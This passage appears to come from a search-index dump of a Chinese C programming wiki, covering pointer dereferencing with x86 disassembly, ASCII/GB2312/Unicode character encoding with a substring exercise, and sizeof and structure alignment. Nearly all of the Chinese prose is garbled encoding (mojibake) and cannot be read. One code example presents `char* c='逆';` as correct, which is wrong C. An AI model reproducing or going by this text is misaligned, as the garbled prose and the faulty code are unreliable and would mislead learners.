0;&#125; *è¿ç®—ç¬¦ å–å€¼è¿ç®—ç¬¦ç”¨çš„ä¹Ÿæ˜¯*æ˜Ÿå·ï¼Œåœ¨ä¹‹å‰çš„å­¦ä¹ ä¸­ã€‚*å¯ä»¥ç”¨æ¥è¡¨ç¤ºä¹˜æ³•è¿ç®—ã€å®šä¹‰æ–°çš„ç±»å‹ã€‚ ä¹˜æ³•è¿ç®—ï¼š 123int x = 1;int y = 2;int z = x * y; å®šä¹‰æ–°çš„ç±»å‹ï¼šï¼ˆ*ä¸åŸæ¥çš„æ•°æ®ç±»å‹ç»„åˆï¼Œå˜æˆä¸€ç§çš„ç±»å‹ï¼‰ 12char x;char* y; è¿™é‡Œæˆ‘ä»¬å­¦ä¹ *å–å€¼è¿ç®—ç¬¦çš„ç”¨æ³•ã€‚å½“*+ä¸€ä¸ªæŒ‡é’ˆç±»å‹çš„è¡¨è¾¾å¼æ—¶ï¼Œè¡¨ç¤ºä»¥è¿™ä¸ªè¡¨è¾¾å¼çš„ç»“æœä½œä¸ºåœ°å€ï¼Œæ¥å–è¿™ä¸ªåœ°å€ä¸Šçš„å€¼ã€‚ ä¸‹é¢è¿™æ®µä»£ç èƒ½ç¼–è¯‘é€šè¿‡ï¼Œä½†è¿è¡Œä¼šæŠ¥0xC0000005å†…å­˜è®¿é—®é”™è¯¯ã€‚å› ä¸ºåœ°å€1æ²¡æŒ‚ç‰©ç†é¡µï¼Œè¿™ä¸ªåœ°å€ä¸Šæ²¡å†…å®¹ 12int* a = (int*)1; //æŒ‡é’ˆaæŒ‡å‘åœ°å€1printf(&quot;%x &quot;, *(a + 1)); //å–åœ°å€(a+1)ä¸Šçš„å€¼ 1234567898: int* a = (int*)1;00401028 mov dword ptr [ebp-4],1 ;å°†1èµ‹å€¼ç»™å˜é‡a9: printf(&quot;%x &quot;, *(a + 1));0040102F mov eax,dword ptr [ebp-4] ;å°†å˜é‡açš„å€¼æ”¾åˆ°eaxä¸­ 00401032 mov ecx,dword ptr [eax+4] ;eax+4åï¼Œå°†eax+4ä½œä¸ºåœ°å€ç¼–å·ï¼Œå–è¯¥åœ°å€ä¸Šçš„å€¼ç»™ecx00401035 push ecx ;å°†ecxå‹æ ˆ00401036 push offset string &quot;%x &quot; (0042201c)0040103B call printf (00401070)00401040 add esp,8 a+1ï¼Œ+1ï¼Œè¡¨ç¤ºä¸‹ä¸€ä¸ªå­˜å‚¨å•å…ƒã€‚aæ˜¯intç±»å‹æŒ‡é’ˆï¼Œè¦+4å­—èŠ‚ï¼Œæ‰€ä»¥æ±‡ç¼–ä¸­æ˜¯+4ã€‚ ï¼ˆ*+æŒ‡é’ˆç±»å‹è¡¨è¾¾å¼ï¼‰çš„ç±»å‹ ç¼–è¯‘æŠ¥é”™ ç¬¬10è¡Œï¼Œç¼–è¯‘æŠ¥é”™ï¼Œæ— æ³•å°†int**ç±»å‹è½¬æ¢ä¸ºintç±»å‹ã€‚è¯´æ˜åŸæœ¬int***ç±»å‹çš„å˜é‡aï¼ŒåŠ *åï¼Œç±»å‹ä¸ºint**ç±»å‹ ç¬¬11è¡Œï¼Œç¼–è¯‘æŠ¥é”™ï¼Œæ— æ³•å°†int***ç±»å‹è½¬æ¢ä¸ºintç±»å‹ã€‚è¯´æ˜åŸæœ¬int****ç±»å‹çš„å˜é‡bï¼ŒåŠ *åï¼Œç±»å‹ä¸ºint***ç±»å‹ ç¬¬12è¡Œï¼Œç¼–è¯‘æŠ¥é”™ï¼Œæ— æ³•å°†int****ç±»å‹è½¬æ¢ä¸ºintç±»å‹ã€‚è¯´æ˜åŸæœ¬int*****ç±»å‹çš„å˜é‡cï¼ŒåŠ *åï¼Œç±»å‹ä¸ºint****ç±»å‹ ç¬¬13è¡Œï¼Œç¼–è¯‘é€šè¿‡ï¼ŒdåŸæœ¬æ˜¯int*ç±»å‹ï¼ŒåŠ *åä¸ºintç±»å‹ï¼Œèƒ½èµ‹ç»™intç±»å‹çš„å˜é‡p ç»“è®ºï¼šï¼ˆ*+æŒ‡é’ˆç±»å‹è¡¨è¾¾å¼ï¼‰çš„ç±»å‹ï¼Œæ˜¯å˜é‡å½“å‰çš„ç±»å‹å‡å»ä¸€ä¸ª*å· å–å€¼è¿ç®—ç¬¦ä¸¾ä¾‹ ä¾‹1 123456int x = 1; //å˜é‡xçš„åœ°å€ç¼–å·ä¸º12ff7cï¼Œå­˜æ”¾çš„å€¼æ˜¯1int* p = &amp;x; //å–å˜é‡xçš„åœ°å€ç¼–å·æ”¾åˆ°å˜é‡pä¸­ï¼Œå³å­˜æ”¾å˜é‡xçš„åœ°å€12ff7cprintf(&quot;%x %x &quot;, p, //è¾“å‡ºå˜é‡pçš„å€¼ï¼ˆå˜é‡xçš„åœ°å€ç¼–å·12ff7cï¼‰ *(p)); //è¾“å‡ºä»¥å˜é‡pä¸ºåœ°å€ç¼–å·ï¼Œå–è¯¥åœ°å€ä¸Šçš„å€¼ï¼ˆå³å˜é‡xçš„å€¼ï¼‰ 1234567891011121314151617: int x = 1;00401028 mov dword ptr [ebp-4],1 ;å°†1èµ‹ç»™å±€éƒ¨å˜é‡6: int* p = &amp;x;0040102F lea eax,[ebp-4] ;å–[ebp-4]çš„å†…å­˜ç¼–å·æ”¾åˆ°å¦ä¸€ä¸ªå±€éƒ¨å˜é‡[ebp-8]ä¸­00401032 mov dword ptr [ebp-8],eax7:8: printf(&quot;%x %x &quot;, p, *(p));00401035 mov ecx,dword ptr [ebp-8] ;ä»¥[ebp-8]ä½œä¸ºåœ°å€ï¼Œå–è¯¥åœ°å€ä¸Šçš„å€¼ï¼Œå‹æ ˆä¼ å‚00401038 mov edx,dword ptr [ecx] 0040103A push edx0040103B mov eax,dword ptr [ebp-8] ;å–[ebp-8]çš„å€¼ï¼Œå‹æ ˆä¼ å‚0040103E push eax0040103F push offset string &quot;%x &quot; (0042201c)00401044 call printf (00401070)00401049 add esp,0Ch ä¾‹2 12int x = 1; int* p = &amp;x; 1p=(int*)2; //æ”¹çš„æ˜¯p 1*(p)=2; //æ”¹çš„æ˜¯pæŒ‡å‘çš„é‚£ä¸ªåœ°å€çš„å€¼ï¼Œå°±æ˜¯æ”¹çš„x ä¾‹3 1234567891011121314151617181920#include &quot;stdafx.h&quot;int x;int* p;int** p2;int*** p3;int main()&#123; x = 1; p = &amp;x; p2 = &amp;p; p3 = &amp;p2; int r = *(*(*(p3))); printf(&quot;%d &quot;, r); return 0;&#125; å˜é‡ å˜é‡çš„åœ°å€ å˜é‡çš„å€¼ x 00427e40 1 p 00427e3c 00427e40 p2 00427e38 00427e3c p3 00427e34 00427e38 å˜é‡p3å­˜çš„æ˜¯å˜é‡p2çš„åœ°å€ï¼Œ*p3=å˜é‡p2 å˜é‡p2å­˜çš„æ˜¯å˜é‡pçš„åœ°å€ï¼Œ*p2=å˜é‡p å˜é‡på­˜çš„æ˜¯å˜é‡xçš„åœ°å€ï¼Œ*p=å˜é‡x ***p3=å˜é‡x ä»æ–°è§†è§’å­¦ä¹ æŒ‡é’ˆ &amp;ä¸ºå–åœ°å€ç¬¦ï¼Œä½œç”¨æ˜¯å–åœ°å€ã€‚åªè¦æ˜¯å˜é‡ï¼Œå°±èƒ½ç”¨&amp;è¿ç®—ç¬¦æ¥å–åœ°å€ã€‚&amp;å˜é‡çš„ç±»å‹æ˜¯åŸæ¥çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*å·ã€‚ *ä¸ºå–å€¼ç¬¦ï¼Œä½œç”¨æ˜¯å–è¯¥å˜é‡æŒ‡å‘å†…å­˜ç¼–å·ä¸­å­˜å‚¨çš„å€¼ã€‚åªè¦æ˜¯æŒ‡é’ˆç±»å‹ï¼Œå°±èƒ½ç”¨*è¿ç®—ç¬¦æ¥å–åœ°å€ã€‚ï¼ˆæ„å‘³ç€å˜é‡ç±»å‹è‡³å°‘æœ‰ä¸€ä¸ª*å·ï¼‰ã€‚*+æŒ‡é’ˆç±»å‹å˜é‡çš„ç±»å‹æ˜¯åŸæ¥çš„ç±»å‹å‡å»ä¸€ä¸ª*å·ã€‚ movæ˜¯å–å€¼ï¼Œleaæ˜¯å–åœ°å€ã€‚ ä¾‹1 123456789101112131415161718#include &quot;stdafx.h&quot;int main()&#123;\tchar a = 10; short b = 20; int c = 30; char* pa = &amp;a; short* pb = &amp;b; int* pc = &amp;c; char** ppa = &amp;pa; short** ppb = &amp;pb; int** ppc = &amp;pc; return 0;&#125; å®Œæ•´å†™æ³•å’Œç®€å†™å½¢å¼1234567891011121314char a = 10; short b = 20; int c = 30; // å®Œæ•´å†™æ³• // &amp;aåçš„ç±»å‹æ˜ç¡®çŸ¥é“æ˜¯char*ï¼Œå¯ä»¥å†™æˆåé¢çš„ç®€å†™å½¢å¼// char* pa = (char*)&amp;a; // short* pb = (short*)&amp;b; // int* pc = (int*)&amp;c; //ç®€å†™å½¢å¼char* pa = &amp;a; short* pb = &amp;b; int* pc = &amp;c; ç¬¬5è¡Œä»£ç ï¼š[ebp-4]æ˜¯å˜é‡ï¼Œå­˜çš„å€¼æ˜¯10 ç¬¬9è¡Œä»£ç ï¼šå–[ebp-4]çš„åœ°å€ï¼Œæ”¾åˆ°å˜é‡paï¼ˆ[ebp-10h]ï¼‰ä¸­ ç¬¬13è¡Œä»£ç ï¼šå–[ebp-10h]çš„åœ°å€ï¼Œæ”¾åˆ°å˜é‡ppaï¼ˆ[ebp-1Ch]ï¼‰ä¸­ ä¾‹2 123456789101112131415161718192021222324#include &quot;stdafx.h&quot;int main()&#123; int p = 10; int******* p7; int****** p6; int***** p5; int**** p4; int*** p3; int** p2; int* p1; p1 = &amp;p; p2 = &amp;p1; p3 = &amp;p2; p4 = &amp;p3; p5 = &amp;p4; p6 = &amp;p5; p7 = &amp;p6; return 0;&#125; å±€éƒ¨å˜é‡åœ¨å †æ ˆä¸­çš„åˆ†é…å…³ç³»å¦‚ä¸‹ï¼š å˜é‡ å †æ ˆ p [ebp-4] p1 [ebp-8] p2 [ebp-0Ch] p3 [ebp-10h] p4 [ebp-14h] p5 [ebp-18h] p6 [ebp-1Ch] p7 [ebp-20h] ç¬¬15è¡Œä»£ç ï¼šå–[ebp-4]çš„åœ°å€ï¼Œæ”¾åˆ°å˜é‡p1ï¼ˆ[ebp-20h]ï¼‰ä¸­ ç¬¬16è¡Œä»£ç ï¼šå–[ebp-20h]çš„åœ°å€ï¼Œæ”¾åˆ°å˜é‡p2ï¼ˆ[ebp-1Ch]ï¼‰ä¸­ â€¦ å¯å‘ çŸ¥é“ç”¨&amp;å–å€ï¼Œ*å–å€¼åçš„ç±»å‹æ˜¯ä»€ä¹ˆï¼Œç”¨çš„æ—¶å€™ä¸ä¼šä¹±ã€‚åœ¨æ±‡ç¼–ä¸­å°±æ˜¯movï¼Œè¿˜æ˜¯leaä¸€ä¸ªå˜é‡æ”¾åˆ°å¦ä¸€ä¸ªå˜é‡ä¸­ã€‚ä¸ç”¨é¢‘ç¹æƒ³å‡ çº§å‡ çº§æŒ‡é’ˆï¼Œå­˜çš„æ˜¯å•¥é‚£äº›ï¼Œæƒ³å¤šäº†è‚¯å®šä¹±ã€‚"},{"title":"å­—ç¬¦å’Œå­—ç¬¦ä¸²","path":"/wiki/C/å­—ç¬¦å’Œå­—ç¬¦ä¸².html","content":"å‰è¨€ å­¦ä¹ æ•°æ®ç±»å‹è¦ä»å®½åº¦ã€æ ¼å¼ã€ä½œç”¨åŸŸè¿™ä¸‰ä¸ªæ–¹é¢è¿›è¡Œå­¦ä¹ ã€‚ æ¯”å¦‚intç±»å‹ï¼Œå†³å®šäº†å®½åº¦æ˜¯4å­—èŠ‚ï¼ŒæŒ‰è¡¥ç æ ¼å¼å­˜å‚¨ï¼› floatç±»å‹ï¼Œå†³å®šäº†å®½åº¦æ˜¯4å­—èŠ‚ï¼ŒIEEEç¼–ç æ ¼å¼ 12int a = 123; //è¡¥ç int float b = 123.4F; //IEEEç¼–ç  é‚£è¿™ç§å½¢å¼æ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿ 1int c = &#x27;A&#x27;; å­—ç¬¦ æ‰€æœ‰æ•°æ®åˆ°å†…å­˜ä¸­æœ€ç»ˆéƒ½ä¼šå˜æˆ0å’Œ1ï¼Œé‚£å­—ç¬¦æ˜¯æ€ä¹ˆè¡¨ç¤ºçš„ï¼Ÿ ç­”æ¡ˆï¼šæŸ¥è¡¨ï¼Œè¿™å¼ è¡¨è®°å½•äº†æ•°å€¼å’Œç¬¦å·ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ ASCIIè¡¨ American Standard Code for Information Interchangeç¾å›½æ ‡å‡†ä¿¡æ¯äº¤æ¢ä»£ç ã€‚ ä¸€å¼€å§‹å—é™äºæˆæœ¬ï¼Œ8ä½å¤ªæ˜‚è´µï¼Œæ ‡å‡†ASCIIè¡¨ç”¨çš„7ä½äºŒè¿›åˆ¶æ•°æ¥è¡¨ç¤ºæ‰€æœ‰çš„å¤§å†™å’Œå°å†™å­—æ¯ï¼Œæ•°å­— 0 åˆ° 9ã€æ ‡ç‚¹ç¬¦å·ï¼Œä»¥åŠåœ¨ç¾å¼è‹±è¯­ä¸­ä½¿ç”¨çš„ç‰¹æ®Šæ§åˆ¶å­—ç¬¦ï¼Œå…±128ä¸ªå­—ç¬¦ã€‚æˆ‘ä»¬å°†å­—ç¬¦Aèµ‹å€¼ç»™å˜é‡æ—¶ï¼Œç¼–è¯‘å™¨ä¼šå»è¿™å¼ è¡¨ä¸­å¯»æ‰¾å¤§å†™çš„Aï¼ŒæŸ¥åˆ°Aå¯¹åº”10è¿›åˆ¶ä¸º65ï¼Œè½¬ä¸º16è¿›åˆ¶å°±æ˜¯0x41ï¼Œç„¶åå°†è¿™ä¸ªäºŒè¿›åˆ¶æ•°å­˜å…¥å˜é‡ä¸­ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™å¼ è¡¨ä¸­æœ€å¤šä¹Ÿå°±æ˜¯å ç”¨ä¸€ä¸ªå­—èŠ‚çš„å®½åº¦ã€‚ç”¨intæ¥å­˜å‚¨int c = 'A';æ˜¾å¾—æœ‰äº›æµªè´¹ï¼Œæ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹ç”¨charæ¥ä½œä¸ºæ•°æ®ç±»å‹ï¼Œæ¯”å¦‚char c = 'A'ã€‚æœ‰äº›ä¹¦ç§°å˜é‡cä¸ºå­—ç¬¦ç±»å‹å˜é‡ï¼Œè¿™ä¼šè®©åˆå­¦è€…è®¤ä¸ºcharç±»å‹å˜é‡å°±æ˜¯ç”¨æ¥å­˜å‚¨å­—ç¬¦çš„ï¼Œå®é™…ä¸Šåœ¨æˆ‘ä»¬çœ¼ä¸­charå°±æ˜¯æ•´å‹å˜é‡ã€‚ ç¼–è¯‘å™¨é€šè¿‡æŸ¥è¡¨å°†â€™Aâ€™å¯¹åº”çš„æ•°å€¼èµ‹ç»™å˜é‡cï¼Œå˜é‡cå­˜çš„å°±æ˜¯ç¼–å·ã€‚ äºŒè¿›åˆ¶æ•° åè¿›åˆ¶ åå…­è¿›åˆ¶ å­—ç¬¦ 0100 0001 65 41 A 0100 0010 66 42 B 0100 0011 67 43 C 0100 0100 68 44 D 0100 0101 69 45 E 0100 0110 70 46 F 0100 0111 71 47 G 0100 1000 72 48 H 0100 1001 73 49 I 0100 1010 74 4A J 0100 1011 75 4B K 0100 1100 76 4C L 0100 1101 77 4D M 0100 1110 78 4E N 0100 1111 79 4F O 0101 0000 80 50 P 0101 0001 81 51 Q 0101 0010 82 52 R 0101 0011 83 53 S 0101 0100 84 54 T 0101 0101 85 55 U 0101 0110 86 56 V 0101 0111 87 57 W 0101 1000 88 58 X 0101 1001 89 59 Y 0101 1010 90 5A Z ä¸Šè¿°è¡¨ä¸­æœ‰ä¸€äº›è½¬ä¹‰å­—ç¬¦ 1 æ‹“å±•ASCIIè¡¨(Extended ASCII) ç”±äºæ ‡å‡†ASClIç å­—ç¬¦é›†å­—ç¬¦æ•°ç›®æœ‰é™ï¼Œåœ¨å®é™…åº”ç”¨ä¸­å¾€å¾€æ— æ³•æ»¡è¶³è¦æ±‚ã€‚æ¥åˆ°æ—©æœŸå°å‹è®¡ç®—æœºå‘å±•æ—¶ï¼Œ8ä½å­—èŠ‚çš„æ ‡å‡†å¾—ä»¥å·©å›ºã€‚ä¸ºæ­¤ï¼Œå›½é™…æ ‡å‡†åŒ–ç»„ç»‡åˆå°†ASCIIç å­—ç¬¦é›†æ‰©å……ä¸º8ä½ä»£ç åŠASCIIç çš„æ‰©å……ã€‚è¿™æ ·ï¼ŒASCIIç çš„å­—ç¬¦é›†å¯ä»¥æ‰©å……128ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨8ä½æ‰©å±•ASClç èƒ½ä¸º256ä¸ªå­—ç¬¦æä¾›ç¼–ç â€œè¿™äº›æ‰©å……å­—ç¬¦çš„ç¼–ç å‡ä¸ºé«˜ä½ä¸º1çš„8ä½ä»£ç ï¼ˆå³åè¿›åˆ¶æ•°128ä¸€255 )ï¼Œç§°ä¸ºæ‰©å±•ASClIç ã€‚æ‰©å±•ASCIIç æ‰€å¢åŠ çš„å­—ç¬¦åŒ…æ‹¬åŠ æ¡†æ–‡å­—ã€åœ†åœˆå’Œå…¶ä»–å›¾å½¢ç¬¦å·ã€‚ æ ‡å‡†ASCIIè¡¨æœ€é«˜ä½ä¸º0ï¼Œæ‰©å±•ASCIIè¡¨è¡¥å……çš„128ä¸ªå­—ç¬¦æœ€é«˜ä½ä¸º1ã€‚ GB2312æˆ–GB2312-80 å³ä½¿8ä½å…¨ç”¨ä¸Šï¼Œä¹Ÿåªèƒ½è¡¨ç¤º256ä¸ªå­—ç¬¦ã€‚åƒä¸­æ–‡è¿™æ ·çš„è±¡å½¢æ–‡å­—çš„åŸºæœ¬ç”¨å­—å¯ä¸åª256ä¸ªã€‚å› ä¸ºæ‰©å±•ASCIIè¡¨é¢å¤–çš„128ä¸ªå­—ç¬¦ä¸­æ–‡ä¸­å¾ˆå°‘ç”¨åˆ°ï¼Œäºæ˜¯åˆ©ç”¨äº†è¿™æ‹“å±•çš„128ä¸ªå­—ç¬¦ä½œæ–‡ç« ã€‚ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ã€‚è§„å®šï¼šå°äº127çš„å­—ç¬¦æ„ä¹‰ä¸åŸæ¥ç›¸åŒï¼Œå½“ä¸¤ä¸ªå¤§äº127çš„å­—ç¬¦è¿åœ¨ä¸€èµ·æ—¶ï¼Œå°±è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ã€‚ç”¨åŒºå’Œä½æ¥å®šä½ï¼Œè¿™å°±æ˜¯GB2312æˆ–GB2312-80ï¼Œä¹Ÿå«æ±‰å­—å›½æ ‡ç ã€‚ ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œæ¯ä¸ªå­—èŠ‚åœ¨80-FFèŒƒå›´å†…ã€‚ å› ä¸ºä¸€ä¸ªæ±‰å­—ç”±ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¦‚æœè¿™æ ·å†™ï¼Œæ˜¯ä¸è¡Œçš„ï¼Œä¼šå‘ç”Ÿæˆªæ–­ï¼š 1char c=&#x27;é€†&#x27;; åŸæœ¬C4 E6è¡¨ç¤ºâ€œé€†â€è¿™ä¸ªå­—ï¼Œç°åœ¨æˆªæ–­äº†ï¼Œé«˜ä½èˆå¼ƒï¼Œä¿ç•™ä½ä½ã€‚ è¦è¿™æ ·å†™ï¼š 1char* c=&#x27;é€†&#x27;; Unicode GB2312æˆ–GB2312-80çš„å¼Šç«¯ï¼š ä¸¤ç§ç¼–ç å¯èƒ½ä½¿ç”¨ç›¸åŒçš„æ•°å­—ä»£è¡¨ä¸¤ä¸ªä¸åŒçš„ç¬¦å·ã€‚ æ¯”å¦‚åœ¨Aå›½å®¶çš„ç¼–ç æ ‡å‡†ä¸‹ï¼ŒC4 E6ä»£è¡¨Î±ï¼Œåœ¨Bå›½å®¶çš„ç¼–ç æ ‡å‡†ä¸‹ï¼ŒC4 E6ä»£è¡¨Î²ã€‚Aå›½å’ŒBå›½å¯¹ç›¸åŒæ•°å­—çš„å®šä¹‰æ–¹å¼ä¸ä¸€æ ·ã€‚ ç›¸åŒçš„ç¬¦å·ï¼Œå´æ˜¯ä¸åŒçš„æ•°å­—æ¥ä»£è¡¨ã€‚ æ¯”å¦‚åœ¨Aå›½å®¶çš„ç¼–ç æ ‡å‡†ä¸‹ï¼ŒÎ±æŸ¥è¡¨å¾—åˆ°æ˜¯C4 E6ï¼Œåœ¨Bå›½å®¶çš„ç¼–ç æ ‡å‡†ä¸‹ï¼ŒÎ±æŸ¥è¡¨å¾—åˆ°æ˜¯CF F2ã€‚ ä¸ºäº†è§£å†³ä¸Šè¿°å¼Šç«¯ï¼ŒUnicodeè¯ç”Ÿäº†ã€‚16ä½ï¼Œå¯ä»¥è¡¨ç¤º65536ä¸ªå­—ç¬¦ã€‚å¯¹ä¸–ç•Œä¸Šæ‰€æœ‰ä¹¦é¢è¯­è¨€å¸¸ç”¨çš„å­—ç¬¦å’Œè±¡å½¢æ–‡å­—æ¥è¯´è¶³å¤Ÿäº†ï¼Œè¿˜å¯ä»¥åŒ…æ‹¬ä¸€æ‰¹æ•°å­¦ã€ç¬¦å·ä»¥åŠè£…é¥°æ ‡å¿—çš„é›†åˆã€‚ å­—ç¬¦ä¸² ä»¥â€™\\0â€™ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ ç»ƒä¹  æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯è¿™æ ·çš„ï¼šchinaä¸­å›½verygoodå¤©æœnice,é‡Œé¢æ—¢å«æœ‰ä¸­æ–‡åˆå«ä¹‰è‹±æ–‡ï¼Œè¯·ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½æˆªå–ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²n(n&lt;=æ€»é•¿åº¦) fn(5) = china fn(6) = chinaä¸­ fn(8) = chinaä¸­å›½v tipsï¼šå­—æ¯ç”¨çš„æ˜¯ASCIIè¡¨ï¼Œ1ä¸ªå­—æ¯å 1ä¸ªå­—èŠ‚ï¼Œä¸­æ–‡ç”¨çš„GB2312ï¼Œ1ä¸ªæ±‰å­—å 2ä¸ªå­—èŠ‚ã€‚åœ¨è¿™ç§å­—ç¬¦å’Œå­—èŠ‚æ•°ä¸ç»Ÿä¸€çš„æƒ…å†µä¸‹å¦‚ä½•å¤„ç†ï¼Ÿ ç­”æ¡ˆæ±‰å­—æ¯ä¸ªå­—èŠ‚æœ€é«˜ä½æ˜¯1ï¼ŒASCIIè¡¨æœ€é«˜ä½æ˜¯0ã€‚ä»£ç è¿è¡Œæˆªå›¾12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;string.h&gt;void fn(const char *str, int n)&#123; int byte_count = 0; for (int len = 0; len &lt; n; len++) &#123; // æœ€é«˜ä½ä¸º0ï¼ŒASCIIå­—ç¬¦ï¼Œå­—èŠ‚æ•°åŠ 1 if ((str[byte_count] &amp; 0x80) == 0) &#123; byte_count++; &#125; // æœ€é«˜ä½ä¸º1ï¼ŒGB2312å­—ç¬¦ï¼Œå­—èŠ‚æ•°åŠ 2 else &#123; byte_count += 2; &#125; &#125; // byte_countæŒ‡ç¤ºäº†æˆ‘ä»¬è¦æ‹·è´çš„å­—èŠ‚æ•°é‡ char result[100]; strncpy(result, str, byte_count); result[byte_count] = &#x27;\\0&#x27;; printf(&quot;%s &quot;, result);&#125;int main()&#123; char str[] = &quot;chinaä¸­å›½verygoodå¤©æœnice&quot;; for (int i = 0; i &lt;= 21; i++) &#123; fn(str, i); &#125; return 0;&#125;"},{"title":"å­—èŠ‚å¯¹é½","path":"/wiki/C/å­—èŠ‚å¯¹é½.html","content":"sizeofè¿ç®—ç¬¦ sizeofè¿ç®—ç¬¦ä»¥å­—èŠ‚ä¸ºå•ä½è¿”å›è¿ç®—å¯¹è±¡çš„å¤§å°ã€‚è¿ç®—å¯¹è±¡å¯ä»¥æ˜¯å…·ä½“çš„æ•°æ®å¯¹è±¡ï¼ˆå¦‚ï¼Œå˜é‡åï¼‰æˆ–ç±»å‹ã€‚å¦‚æœè¿ç®—å¯¹è±¡æ˜¯ç±»å‹ï¼ˆå¦‚ï¼Œfloatï¼‰ï¼Œåˆ™å¿…é¡»ç”¨åœ†æ‹¬å·å°†å…¶æ‹¬èµ·æ¥ã€‚ Cè¯­è¨€è§„å®šï¼Œsizeofè¿”å›size_tç±»å‹çš„å€¼ã€‚è¿™æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ç±»å‹ï¼Œsize_tæ˜¯è¯­è¨€å®šä¹‰çš„æ ‡å‡†ç±»å‹ã€‚åœ¨Cå¤´æ–‡ä»¶ä¸­ï¼Œç”¨äº†typedefå°†size_tä½œä¸ºunsigned intæˆ–unsigned longçš„åˆ«åï¼Œåœ¨ä½¿ç”¨size_tç±»å‹æ—¶ï¼Œç¼–è¯‘å™¨æ ¹æ®ä¸åŒçš„ç³»ç»Ÿæ›¿æ¢æ ‡å‡†ç±»å‹ã€‚ C99åšäº†è¿›ä¸€æ­¥è°ƒæ•´ï¼Œæ–°å¢äº†%zdè½¬æ¢è¯´æ˜ç”¨äºprintf()æ˜¾ç¤ºsize_tç±»å‹çš„å€¼ã€‚å¦‚æœç³»ç»Ÿä¸æ”¯æŒ%zdï¼Œå¯ä½¿ç”¨%uæˆ–%luä»£æ›¿%zdã€‚ åŸºæœ¬ç±»å‹æ•°ç»„ç»“æ„ä½“12345678910printf(&quot;%d &quot;,sizeof(char)); printf(&quot;%d &quot;,sizeof(short int));\t//çŸ­æ•´å‹ï¼Œshortçš„å®Œæ•´å†™æ³•printf(&quot;%d &quot;,sizeof(int)); printf(&quot;%d &quot;,sizeof(long int));\tprintf(&quot;%d &quot;,sizeof(__int64));\tprintf(&quot;%d &quot;,sizeof(float));\tprintf(&quot;%d &quot;,sizeof(double)); int x = 10;\tprintf(&quot;%d &quot;,sizeof(x)); 1234567891011char arr1[10] = &#123;0&#125;;\tshort arr2[10] = &#123;0&#125;;\tint arr3[10] = &#123;0&#125;; printf(&quot;%d &quot;,sizeof(arr1));\tprintf(&quot;%d &quot;,sizeof(arr2));\tprintf(&quot;%d &quot;,sizeof(arr3)); printf(&quot;%d &quot;,sizeof(arr1[10]));\t//æ‰“å°arr1æ•°ç»„ç¬¬10ä¸ªå…ƒç´ çš„å¤§å°ï¼Œè™½ç„¶è¶Šç•Œäº†ï¼Œè¿˜æ˜¯èƒ½æ‰“å°printf(&quot;%d &quot;,sizeof(arr2[10]));\tprintf(&quot;%d &quot;,sizeof(arr3[10])); 123456789101112131415161718192021222324252627struct S1&#123; char a; int b; char c;&#125;;struct S2&#123; int a; char b; char c;&#125;;int main(int argc, char *argv[])&#123; S1 x; S2 y; printf(&quot;%d &quot;, sizeof(x)); printf(&quot;%d &quot;, sizeof(y)); printf(&quot;%d &quot;, sizeof(S1)); printf(&quot;%d &quot;, sizeof(S2)); return 0;&#125; å­—èŠ‚å¯¹é½ ç°ä»£è®¡ç®—æœºçš„å†…å­˜æ˜¯ä»¥byteä¸ºåŸºæœ¬å•å…ƒï¼Œè¿™è®©ç¨‹åºå‘˜è¯¯ä»¥ä¸ºæ•°æ®å¯ä»¥å­˜æ”¾åœ¨ä»»ä½•èµ·å§‹åœ°å€ï¼Œä½†å®é™…ä¸Šå¹¶ä¸æ˜¯è¿™æ ·ã€‚ The chips in your computer are very good at working with fixed-size numbers. This is the reason why the basic integer types in C grow in powers of two (char = 1 byte, short = 2 bytes, int = 4 bytes, long = 8 bytes). But it further turns out that the computer can only work efficiently if these fixed-size numbers are aligned at specific addresses in memory. å‚è€ƒï¼šLecture 5: Structures and Alignment ç®€å•ç‚¹è¯´ï¼Œå› ä¸ºè®¡ç®—æœºç”¨äºŒè¿›åˆ¶æ•°ï¼Œå¯¹2çš„å¹‚æ¬¡æ–¹çš„æ•°æ®å¤„ç†èµ·æ¥æ›´é«˜æ•ˆã€‚å¦‚æœæˆ‘ä»¬å°†è¿™äº›å›ºå®šå¤§å°çš„å˜é‡ç±»å‹ï¼ˆfixed-size numbersï¼‰æ”¾åœ¨ç‰¹å®šçš„åœ°å€ä¸Šï¼Œè€Œä¸æ˜¯æŒ‰é¡ºåºä¸€ä¸ªæ¥ç€ä¸€ä¸ªå­˜æ”¾ï¼Œè¿™æ ·è®¡ç®—æœºå¤„ç†èµ·æ¥ä¼šæ›´é«˜æ•ˆã€‚ å®é™…ä¸Šï¼Œæ¯ä¸ªå¯¹è±¡ï¼ˆObjectï¼‰é™¤äº†æœ‰å¤§å°ï¼ˆsizeï¼‰ä¹‹å¤–ï¼Œè¿˜æœ‰å¯¹é½è¦æ±‚ï¼ˆalignment requirementï¼‰çš„å±æ€§ï¼ŒThe alignment means that all objects of this type must start at an address divisible by the alignment. In other words, an integer with size 4 and alignment 4 must always start at an address divisible by 4. å­—èŠ‚å¯¹é½ï¼Œå®é™…ä¸Šæ˜¯å˜é‡èµ·å§‹å†…å­˜åœ°å€çš„å¯¹é½ï¼Œç¼–è¯‘å™¨å¹¶ä¸è®©objectè¿ç»­åœ°ç´§æŒ¨åœ¨ä¸€èµ·ï¼Œè€Œæ˜¯ä¼šå®‰æ’æ¯ä¸ªpbjectåœ¨å†…å­˜ä¸­çš„æ’å¸ƒï¼Œè®©æ¯ä¸ªobjectéƒ½æ»¡è¶³å®ƒçš„alignment 